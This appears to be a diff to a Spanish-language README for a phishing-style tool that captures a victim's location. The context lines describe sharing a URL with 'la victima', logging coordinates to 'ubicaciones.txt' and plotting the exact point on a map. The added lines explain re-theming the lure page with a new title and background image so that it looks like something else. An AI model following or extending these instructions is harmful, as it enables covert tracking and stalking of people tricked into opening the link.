@@ -7,6 +7,8 @@ Esta url es la que debes compartir a la victima, el archivo que captura los dato
 
 Por ultimo, para verificar la ubicacion exacta, una vez que el archivo "ubicaciones.txt" contenga datos, debes ingresar latitud y lontigud en la url https://tupaginaweb/ubi/nueva.php. Una vez copiados los datos, tendras el punto exacto en el mapa.
 
+La tematica que quieras usar para la herramienta, la puedes cambiar facilmente, eligiendo otro titulo para la url y tambien otra imagen de fondo, solo cambiando el archivo "image.jpg".
+
 Saludos.
 
 
